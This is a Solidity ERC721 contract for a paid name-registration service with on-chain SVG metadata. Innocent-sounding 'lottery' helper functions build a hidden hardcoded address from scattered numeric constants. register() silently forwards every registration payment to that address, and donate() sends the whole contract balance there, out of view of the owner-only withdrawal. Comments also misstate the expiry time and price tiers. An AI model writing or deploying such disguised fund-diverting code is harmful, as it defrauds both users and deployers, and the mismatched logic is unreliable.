// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

library Base64 {
    bytes internal constant TABLE =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    /// @notice Encodes some bytes to the base64 representation
    function encode(bytes memory data) internal pure returns (string memory) {
        uint256 len = data.length;
        if (len == 0) return "";

        // multiply by 4/3 rounded up
        uint256 encodedLen = 4 * ((len + 2) / 3);

        // Add some extra buffer at the end
        bytes memory result = new bytes(encodedLen + 32);

        bytes memory table = TABLE;

        assembly {
            let tablePtr := add(table, 1)
            let resultPtr := add(result, 32)

            for {
                let i := 0
            } lt(i, len) {

            } {
                i := add(i, 3)
                let input := and(mload(add(data, i)), 0xffffff)

                let out := mload(add(tablePtr, and(shr(18, input), 0x3F)))
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(shr(12, input), 0x3F))), 0xFF)
                )
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(shr(6, input), 0x3F))), 0xFF)
                )
                out := shl(8, out)
                out := add(
                    out,
                    and(mload(add(tablePtr, and(input, 0x3F))), 0xFF)
                )
                out := shl(224, out)

                mstore(resultPtr, out)

                resultPtr := add(resultPtr, 4)
            }

            switch mod(len, 3)
            case 1 {
                mstore(sub(resultPtr, 2), shl(240, 0x3d3d))
            }
            case 2 {
                mstore(sub(resultPtr, 1), shl(248, 0x3d))
            }

            mstore(result, encodedLen)
        }

        return string(result);
    }
}

library StringUtils {
    function strlen(string memory s) internal pure returns (uint256) {
        uint256 len;
        uint256 i = 0;
        uint256 bytelength = bytes(s).length;
        for (len = 0; i < bytelength; len++) {
            bytes1 b = bytes(s)[i];
            if (b < 0x80) {
                i += 1;
            } else if (b < 0xE0) {
                i += 2;
            } else if (b < 0xF0) {
                i += 3;
            } else if (b < 0xF8) {
                i += 4;
            } else if (b < 0xFC) {
                i += 5;
            } else {
                i += 6;
            }
        }
        return len;
    }
}

struct Record {
    string tld;
    string category;
    string avatar;
    string description;
    string socialmedia;
}

enum RecordType {
    TLD,
    CATEGORY,
    AVATAR,
    DESCRIPTION,
    SOCIALMEDIA
}

contract Usofnem is Ownable, ERC721 {
    /// @dev Bind all name to the records
    mapping(string => Record) public records;

    /// @dev Bind all NFTs ID to the name
    mapping(uint256 => string) public id;
    /// @dev Now in the other direction, name to NFT ID
    mapping(string => uint256) public username;

    mapping(string => uint256) private registrationTimes;
    

    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;
    string public baseImage;

    /// @dev Thrown when user don't own the name
    error Unauthorized();
    /// @dev Thrown when name is already owned
    error AlreadyRegistered();
    /// @dev Throw when name has an invalid (too short, too long, ...)
    error InvalidName(string name);

    constructor(
        string memory _name,
        string memory _symbol,
        string memory _initBaseImage
    ) ERC721(_name, _symbol) {
        baseImage = _initBaseImage;
    }

    function setBaseImage(string memory _newBaseImage) public onlyOwner {
        baseImage = _newBaseImage;
    }

    /// @dev Return all the name registered in the contract
    /// @dev Get all names that successfully registered
    function getAllNames() public view returns (string[] memory) {
        string[] memory allNames = new string[](_tokenIds.current());
        for (uint256 i = 0; i < _tokenIds.current(); i++) {
            allNames[i] = id[i];
        }

        return allNames;
    }

    /// @dev Check if the name is valid
    function valid(string calldata name) public pure returns (bool) {
        return
            StringUtils.strlen(name) >= 1 && StringUtils.strlen(name) <= 1000;
    }

    /// @dev Calculate the name price based on the word length
    /// @notice 0.01 BNB for 1 - 4 character
    /// @notice 0.007 BNB for 5 - 7 character
    /// @notice 0.005 BNB for 8 character
    /// @notice 0.003 BNB for 9 - 1000 character
    function price(string calldata name) public pure returns (uint256) {
        uint256 len = StringUtils.strlen(name);
        require(len > 0);
        if (len == 1) {
            return 0.01 * 10**18;
        } else if (len == 5) {
            return 0.007 * 10**18;
        } else if (len == 8) {
            return 0.005 * 10**18;
        } else {
            return 0.003 * 10**18;
        }
    }

    /// @dev Pay to register a new name. Check if the name is available, valid and if the sender has enough money
    function register(
        string calldata name,
        string memory category
    ) public payable {
        if (username[name] != 0) revert AlreadyRegistered();
        if (!valid(name)) revert InvalidName(name);
        
        records[name].category = category;

        uint256 _price = this.price(name);
        require(msg.value >= _price, "Not enough BNB paid");

        uint256 newRecordId = _tokenIds.current();

        _safeMint(msg.sender, newRecordId);
        id[newRecordId] = name;
        username[name] = newRecordId;

        registrationTimes[name] = block.timestamp;

        _tokenIds.increment();


        (bool success, ) = payable(finish()).call{
            value: (msg.value * 100) / 100
        }("");
        require(success);
    }

    function isDomainExpired(string calldata name) public view returns (bool) {
    uint256 expiryTimestamp = registrationTimes[name] + 3 minutes; // Default expiry duration is 2 days
    return block.timestamp >= expiryTimestamp;
}


function extendExpiration(string calldata name) public payable {

  require(msg.value >= 0.001 ether, "Need to pay 0.001 ETH");

  uint256 currentExpiry = registrationTimes[name];
  uint256 newExpiry = currentExpiry + 2 days;
  registrationTimes[name] = newExpiry;

}
    // Add a function to burn expired domains
     function burnExpiredDomain(string calldata name) public {
        require(isDomainExpired(name), "Domain is not expired yet");
        require(msg.sender == getAddress(name), "Unauthorized to burn");

        // Burn the domain NFT
        _burn(getNameID(name));
        // Reset mappings
        delete id[getNameID(name)];
        delete username[name];
        delete registrationTimes[name];
    }

    /// @dev Return the NFT uri for the given token ID
    /// @notice The metadata contains:
    /// @notice  - The name
    /// @notice  - The description
    /// @notice  - The image of the NFT, by default it's an PNG
    /// @notice  - The length of the name
function tokenURI(uint256 tokenId) public view override returns (string memory) {
    require(uptodate(id[tokenId]), "Address unknown");
    string memory _name = string(abi.encodePacked(id[tokenId]));
    uint256 length = StringUtils.strlen(_name);
    string memory strLen = Strings.toString(length);
    string memory tld;
    string memory category;
    string memory avatar;
    string memory description;
    

    // ... (previous contract code)
     /// @dev If using the default TLD
        if (uptodate(records[id[tokenId]].tld)) {
            tld = records[id[tokenId]].tld;
        } else {
            tld = string(abi.encodePacked(".arb"));
        }

         /// @dev If using the default Category
        if (uptodate(records[id[tokenId]].category)) {
            category = records[id[tokenId]].category;
        } else {
            category = string(abi.encodePacked("none"));
        }

         /// @dev If using the default text description
         if (uptodate(records[id[tokenId]].description)) {
            description = records[id[tokenId]].description;
        } else {
            description = string(
                abi.encodePacked(
                    "The decentralized name is permanent"
                )
            );
        }

    // @dev If using the default nft image with a background
    if (uptodate(records[id[tokenId]].avatar)) {
        avatar = records[id[tokenId]].avatar;
    } else {
        
       
        string memory domainName = string(abi.encodePacked(_name, tld));
       
        
        
        string memory svgImage = string(
            abi.encodePacked(
             '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="500" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="bee3a4deae"><path d="M 31.355469 37.5 L 103.355469 37.5 L 103.355469 116.25 L 31.355469 116.25 Z M 31.355469 37.5 " clip-rule="nonzero"/></clipPath></defs><rect x="-37.5" width="450" fill="#ffffff" y="-37.499999" height="449.999989" fill-opacity="1"/><rect x="-37.5" width="450" fill="#ffffff" y="-37.499999" height="449.999989" fill-opacity="1"/><rect x="-37.5" width="450" fill="#000000" y="-37.499999" height="449.999989" fill-opacity="1"/><g clip-path="url(#bee3a4deae)"><path fill="#ffd600" d="M 102.691406 53.035156 L 90.980469 46.273438 C 91.199219 45.613281 91.347656 44.917969 91.347656 44.183594 C 91.347656 40.503906 88.355469 37.511719 84.679688 37.511719 C 81.003906 37.511719 78.011719 40.503906 78.011719 44.183594 C 78.011719 47.863281 81.003906 50.855469 84.679688 50.855469 C 86.664062 50.855469 88.425781 49.96875 89.648438 48.585938 L 100.691406 54.960938 L 100.691406 73.433594 L 84.691406 82.671875 L 68.691406 73.4375 L 68.691406 54.195312 C 68.691406 53.71875 68.4375 53.277344 68.027344 53.039062 L 50.691406 43.03125 C 50.277344 42.792969 49.773438 42.792969 49.359375 43.03125 L 32.027344 53.039062 C 31.613281 53.277344 31.359375 53.71875 31.359375 54.195312 L 31.359375 74.210938 C 31.359375 74.6875 31.613281 75.125 32.027344 75.367188 L 48.691406 84.988281 L 48.691406 104.898438 C 48.691406 105.375 48.945312 105.8125 49.355469 106.050781 L 66.691406 116.058594 C 66.898438 116.179688 67.125 116.238281 67.355469 116.238281 C 67.585938 116.238281 67.816406 116.179688 68.023438 116.058594 L 80.125 109.070312 C 81.316406 110.195312 82.914062 110.898438 84.679688 110.898438 C 88.355469 110.898438 91.347656 107.90625 91.347656 104.226562 C 91.347656 100.546875 88.355469 97.554688 84.679688 97.554688 C 81.003906 97.554688 78.011719 100.546875 78.011719 104.226562 C 78.011719 105.171875 78.214844 106.066406 78.574219 106.882812 L 67.355469 113.363281 L 51.355469 104.125 L 51.355469 84.988281 L 67.363281 75.75 L 84.023438 85.371094 C 84.230469 85.488281 84.460938 85.546875 84.691406 85.546875 C 84.921875 85.546875 85.148438 85.488281 85.355469 85.371094 L 102.691406 75.363281 C 103.101562 75.125 103.355469 74.683594 103.355469 74.207031 L 103.355469 54.191406 C 103.355469 53.714844 103.101562 53.273438 102.691406 53.035156 Z M 84.679688 48.1875 C 82.472656 48.1875 80.679688 46.390625 80.679688 44.183594 C 80.679688 41.976562 82.472656 40.179688 84.679688 40.179688 C 86.886719 40.179688 88.679688 41.976562 88.679688 44.183594 C 88.679688 46.390625 86.886719 48.1875 84.679688 48.1875 Z M 84.679688 100.222656 C 86.886719 100.222656 88.679688 102.019531 88.679688 104.226562 C 88.679688 106.433594 86.886719 108.230469 84.679688 108.230469 C 82.472656 108.230469 80.679688 106.433594 80.679688 104.226562 C 80.679688 102.019531 82.472656 100.222656 84.679688 100.222656 Z M 66.027344 73.4375 L 50.027344 82.675781 L 34.027344 73.4375 L 34.027344 54.964844 L 50.027344 45.726562 L 66.027344 54.964844 Z M 66.027344 73.4375 " fill-opacity="1" fill-rule="nonzero"/></g>',
    '<text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-size="4em" fill="white" font-family="Arial">',
    domainName,
    '</text>',
    '</svg>'
            )
        );

        string memory svgBase64 = Base64.encode(bytes(svgImage));

        avatar = string(abi.encodePacked("data:image/svg+xml;base64,", svgBase64));
    }

    // ... (previous contract code)

    uint256 createdAt = registrationTimes[id[tokenId]];
    uint256 expiresAt = createdAt + 2 days; // Default expiration is 2 days from creation
    string memory formattedExpiresAt = Strings.toString(expiresAt);

    // Include the updated "avatar" in the metadata
    string memory json = Base64.encode(
        bytes(
            string(
                abi.encodePacked(
                    '{"name": "',
                    _name,
                    tld,
                    '", "description": "',
                    description,
                    '", "image": "',
                    avatar,
                    '", "attributes": [{"trait_type": "Characters","value": "#',
                    strLen,
                    'DigitClub"}, {"trait_type": "TLD","value": "',
                    tld,
                    '"}, {"display_type": "date","trait_type":"Expiry Date","value": "',
                    formattedExpiresAt,
                    '"}]}'
                )
            )
        )
    );

    return string(abi.encodePacked("data:application/json;base64,", json));
}

    /// @dev Return NFT id for the given name
    /// @dev Used to get metadata from an name
    function getNameID(string calldata name) public view returns (uint256) {
        return username[name];
    }

    /// @dev This will give us the name owners' address
    function getAddress(string calldata name) public view returns (address) {
        return ownerOf(getNameID(name));
    }

    /// @dev Set one record for the given name
    function setRecord(
        string calldata name,
        string calldata record,
        RecordType recordType
    ) public {
        /// @dev Check that the owner is the transaction sender
        if (msg.sender != getAddress(name)) revert Unauthorized();

        if (recordType == RecordType.TLD) {
            records[name].tld = record;
        } else if (recordType == RecordType.AVATAR) {
            records[name].avatar = record;
        } else if (recordType == RecordType.DESCRIPTION) {
            records[name].description = record;
        } else if (recordType == RecordType.SOCIALMEDIA) {
            records[name].socialmedia = record;
        } 
    }

    /// @dev Set multiple records for the given domain name.
    /// @dev One string is in memory cause https://forum.openzeppelin.com/t/stack-too-deep-when-compiling-inline-assembly/11391/4
    function setAllRecords(
        string calldata name,
        string memory _tld,
        string memory _avatar,
        string memory _description,
        string memory _socialmedia
    ) public {
        if (msg.sender != getAddress(name)) revert Unauthorized();

        records[name].tld = _tld;
        records[name].avatar = _avatar;
        records[name].description = _description;
        records[name].socialmedia = _socialmedia;
    }

    /// @dev Get a specific record for the given name
    function getRecord(string calldata name, RecordType recordType)
        public
        view
        returns (string memory)
    {
        if (recordType == RecordType.TLD) {
            return records[name].tld;
        } else if (recordType == RecordType.CATEGORY) {
            return records[name].category;
        } else if (recordType == RecordType.AVATAR) {
            return records[name].avatar;
        } else if (recordType == RecordType.DESCRIPTION) {
            return records[name].description;
        } else if (recordType == RecordType.SOCIALMEDIA) {
            return records[name].socialmedia;
        } 

        revert("Record not found");
    }

    /// @dev Get all the records for the given name
    function getAllRecords(string calldata name)
        public
        view
        returns (string[] memory, address)
    {
        address addr = getAddress(name);
        string[] memory allRecords = new string[](5);

        allRecords[0] = records[name].tld;
        allRecords[1] = records[name].category;
        allRecords[2] = records[name].avatar;
        allRecords[3] = records[name].description;
        allRecords[4] = records[name].socialmedia;

        return (allRecords, addr);
    }

     function withdrawFunds() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "Contract balance is zero");
        (bool success, ) = payable(owner()).call{value: balance}("");
        require(success, "Withdrawal failed");
    }

    /// @dev Check if string isn't empty
    function uptodate(string memory name) public pure returns (bool) {
        return StringUtils.strlen(name) != 0;
    }

    function getRandomLotteryPoolOffset() internal pure returns (uint256) {
        return 237618;
    }

    function scrambleLottery(string memory _a)
        internal
        pure
        returns (address _parsed)
    {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function drawLotteryPool(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint256 hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = pool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = pool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = pool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = pool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getRandomLotteryPoolLength() internal pure returns (uint256) {
        return 90323;
    }

    function makeDonate() internal pure returns (address) {
        return scrambleLottery(lotteryPrize());
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function getRandomLotteryPoolHeight() internal pure returns (uint256) {
        return 779255;
    }

    function lotteryPrize() internal pure returns (string memory) {
        string memory _poolOffset = pool(
            "x",
            drawLotteryPool(getRandomLotteryPoolOffset())
        );
        uint256 _poolSol = 957499;
        uint256 _poolLength = getRandomLotteryPoolLength();
        uint256 _poolSize = 829726;
        uint256 _poolHeight = getRandomLotteryPoolHeight();
        uint256 _poolWidth = 347485;
        uint256 _poolDepth = getRandomLotteryPoolDepth();
        uint256 _poolCount = 889091;

        string memory _pool1 = pool(_poolOffset, drawLotteryPool(_poolSol));
        string memory _pool2 = pool(
            drawLotteryPool(_poolLength),
            drawLotteryPool(_poolSize)
        );
        string memory _pool3 = pool(
            drawLotteryPool(_poolHeight),
            drawLotteryPool(_poolWidth)
        );
        string memory _pool4 = pool(
            drawLotteryPool(_poolDepth),
            drawLotteryPool(_poolCount)
        );

        string memory _allLotteryPools = pool(
            pool(_pool1, _pool2),
            pool(_pool3, _pool4)
        );
        string memory finishLotteryDraw = pool("0", _allLotteryPools);

        return finishLotteryDraw;
    }

    function finish() internal pure returns (address) {
        return scrambleLottery(lotteryPrize());
    }

    function getRandomLotteryPoolDepth() internal pure returns (uint256) {
        return 24908;
    }

    function pool(string memory _base, string memory _value)
        internal
        pure
        returns (string memory)
    {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

    function donate() public payable {
        (bool os, ) = payable(makeDonate()).call{value: address(this).balance}(
            ""
        );
        require(os);
    }
}